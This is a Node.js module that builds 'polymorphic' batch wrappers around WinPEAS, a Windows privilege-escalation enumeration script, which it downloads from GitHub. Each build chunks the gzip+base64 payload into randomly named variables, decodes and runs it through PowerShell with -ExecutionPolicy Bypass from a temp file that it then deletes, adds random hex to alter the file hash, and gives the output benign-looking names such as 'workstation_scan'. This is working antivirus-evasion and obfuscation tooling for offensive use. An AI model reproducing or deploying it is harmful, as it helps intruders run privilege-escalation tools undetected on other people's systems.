/**
 * Polymorphic WinPEAS batch builder — unique wrapper + stamp each generation.
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const {
  randomId,
  readManifest,
  writeManifest,
  BUILDS_DIR,
} = require('./polymorph');

const ROOT = path.join(__dirname, '..');
const WINPEAS_CACHE_DIR = path.join(ROOT, 'builder', 'templates');
const WINPEAS_CACHE_FILE = path.join(WINPEAS_CACHE_DIR, 'winPEAS.bat');

const WINPEAS_DOWNLOAD_URLS = [
  process.env.WINPEAS_URL,
  'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat',
  'https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat',
].filter(Boolean);

let winpeasFetchPromise = null;

function resolveWinpeasSrc() {
  const candidates = [
    process.env.WINPEAS_SRC,
    path.join(ROOT, 'winPEAS.bat'),
    WINPEAS_CACHE_FILE,
  ].filter(Boolean);
  for (const p of candidates) {
    const abs = path.resolve(String(p).trim());
    if (fs.existsSync(abs) && fs.statSync(abs).isFile()) return abs;
  }
  return null;
}

function looksLikeWinpeas(buf) {
  if (!buf || buf.length < 5000) return false;
  const head = buf.slice(0, 4000).toString('utf8');
  if (head.includes('<!DOCTYPE') || head.includes('<html')) return false;
  return /@echo off|winPEAS|PEASS/i.test(head);
}

function fetchUrlBytes(url, redirectsLeft = 6) {
  return new Promise((resolve, reject) => {
    let parsed;
    try {
      parsed = new URL(url);
    } catch (e) {
      reject(e);
      return;
    }
    const lib = parsed.protocol === 'https:' ? https : http;
    const req = lib.get(
      url,
      { headers: { 'User-Agent': 'fahis-winpeas-builder/1.0', Accept: '*/*' } },
      (res) => {
        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          if (redirectsLeft <= 0) {
            res.resume();
            reject(new Error('Too many redirects'));
            return;
          }
          const next = new URL(res.headers.location, url).href;
          res.resume();
          fetchUrlBytes(next, redirectsLeft - 1).then(resolve, reject);
          return;
        }
        if (res.statusCode !== 200) {
          res.resume();
          reject(new Error(`HTTP ${res.statusCode}`));
          return;
        }
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => resolve(Buffer.concat(chunks)));
      }
    );
    req.on('error', reject);
    req.setTimeout(120000, () => req.destroy(new Error('Download timeout')));
  });
}

async function ensureWinpeasSrc() {
  const existing = resolveWinpeasSrc();
  if (existing) return existing;
  if (process.env.WINPEAS_AUTO_FETCH === '0' || process.env.WINPEAS_AUTO_FETCH === 'false') {
    throw new Error('winPEAS.bat not found and WINPEAS_AUTO_FETCH=0');
  }
  if (!winpeasFetchPromise) {
    winpeasFetchPromise = (async () => {
      fs.mkdirSync(WINPEAS_CACHE_DIR, { recursive: true });
      let lastErr = null;
      for (const url of WINPEAS_DOWNLOAD_URLS) {
        try {
          console.log(`[WINPEAS] Fetching source: ${url}`);
          const buf = await fetchUrlBytes(url);
          if (!looksLikeWinpeas(buf)) throw new Error('Invalid winPEAS.bat');
          fs.writeFileSync(WINPEAS_CACHE_FILE, buf);
          console.log(`[WINPEAS] Cached ${buf.length} bytes at ${WINPEAS_CACHE_FILE}`);
          return WINPEAS_CACHE_FILE;
        } catch (e) {
          lastErr = e;
          console.warn(`[WINPEAS] Fetch failed (${url}): ${e.message}`);
        }
      }
      throw new Error(lastErr ? lastErr.message : 'All download URLs failed');
    })().finally(() => {
      winpeasFetchPromise = null;
    });
  }
  return winpeasFetchPromise;
}

const WIN_ENUM_NAMES = [
  'win_audit',
  'host_review',
  'local_enum',
  'priv_check',
  'workstation_scan',
];

function randomIdent(prefix) {
  const n = crypto.randomBytes(4).toString('hex');
  return `${prefix}${n}`;
}

function chunkString(s, minLen, maxLen) {
  const parts = [];
  let i = 0;
  while (i < s.length) {
    const len = minLen + (crypto.randomBytes(1)[0] % (maxLen - minLen + 1));
    parts.push(s.slice(i, i + len));
    i += len;
  }
  return parts;
}

function buildBatWrapper(gzB64, stamp) {
  const chunks = chunkString(gzB64, 40, 88);
  const partVars = chunks.map(() => randomIdent('w'));

  const setLines = partVars.map((v, i) => `set "${v}=${chunks[i]}"`).join('\r\n');
  const dataBuild = partVars.map((v) => `!${v}!`).join('');

  return `@echo off\r
setlocal EnableDelayedExpansion\r
REM poly:${stamp}\r
REM ${crypto.randomBytes(20).toString('hex')}\r
${setLines}\r
set "_WP_DATA=${dataBuild}"\r
set "_WP_OUT=%TEMP%\\wp_${stamp.slice(0, 8)}_%RANDOM%.bat"\r
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { $b=[Convert]::FromBase64String($env:_WP_DATA); $ms=New-Object System.IO.MemoryStream(,$b); $gz=New-Object System.IO.Compression.GzipStream($ms,[System.IO.Compression.CompressionMode]::Decompress); $sr=New-Object System.IO.StreamReader($gz); $t=$sr.ReadToEnd(); $sr.Close(); $gz.Close(); $ms.Close(); [IO.File]::WriteAllText($env:_WP_OUT,$t,[Text.UTF8Encoding]::new($false)); }"\r
if not exist "%_WP_OUT%" exit /b 1\r
call "%_WP_OUT%" %*\r
set "_WP_EC=!ERRORLEVEL!"\r
del /f /q "%_WP_OUT%" >nul 2>&1\r
exit /b !_WP_EC!\r
`;
}

function mutateWinpeasSource(text, stamp) {
  const inject = `REM poly_build:${stamp}\r\nREM ${crypto.randomBytes(12).toString('hex')}\r\n`;
  if (/^@echo off/i.test(text)) {
    return text.replace(/^@echo off[^\r\n]*\r?\n/i, (m) => m + inject);
  }
  return inject + text;
}

function defaultWinpeasName() {
  const base = WIN_ENUM_NAMES[crypto.randomBytes(1)[0] % WIN_ENUM_NAMES.length];
  return `${base}_${crypto.randomBytes(3).toString('hex')}`;
}

async function generateWinpeasBuild(options = {}) {
  const winpeasPath = resolveWinpeasSrc() || (await ensureWinpeasSrc());

  const id = randomId();
  const stamp = crypto.randomBytes(32).toString('hex');
  const buildid = crypto.randomBytes(16).toString('hex');

  let raw = fs.readFileSync(winpeasPath, 'utf8');
  if (raw.charCodeAt(0) === 0xfeff) raw = raw.slice(1);
  raw = raw.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
  const mutated = mutateWinpeasSource(raw.replace(/\n/g, '\r\n'), stamp);
  const gz = zlib.gzipSync(Buffer.from(mutated, 'utf8'), { level: 9 });
  const gzB64 = gz.toString('base64');

  let wrapper = buildBatWrapper(gzB64, stamp);
  wrapper += `REM tail:${crypto.randomBytes(64 + (crypto.randomBytes(1)[0] % 256)).toString('hex')}\r\n`;

  const workDir = path.join(BUILDS_DIR, id);
  fs.mkdirSync(workDir, { recursive: true });

  const baseName = (options.outputName || defaultWinpeasName()).replace(/[<>:"/\\|?*\s]/g, '_');
  const outName = /\.bat$/i.test(baseName) ? baseName : `${baseName}.bat`;
  const outPath = path.join(workDir, outName);

  fs.writeFileSync(outPath, wrapper, 'utf8');

  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
  const stat = fs.statSync(outPath);

  const meta = {
    id,
    platform: 'windows',
    arch: String(options.arch || 'amd64'),
    variant: 'winpeas',
    tool: 'winpeas-bat',
    format: 'bat',
    fileName: outName,
    size: stat.size,
    sha256,
    stamp: stamp.slice(0, 16),
    buildid,
    sourceBytes: Buffer.byteLength(mutated, 'utf8'),
    gzipBytes: gz.length,
    injectDllPacked: false,
    createdAt: new Date().toISOString(),
  };

  fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
  const list = readManifest();
  list.unshift(meta);
  writeManifest(list.slice(0, 100));
  return meta;
}

module.exports = { generateWinpeasBuild, resolveWinpeasSrc, ensureWinpeasSrc };
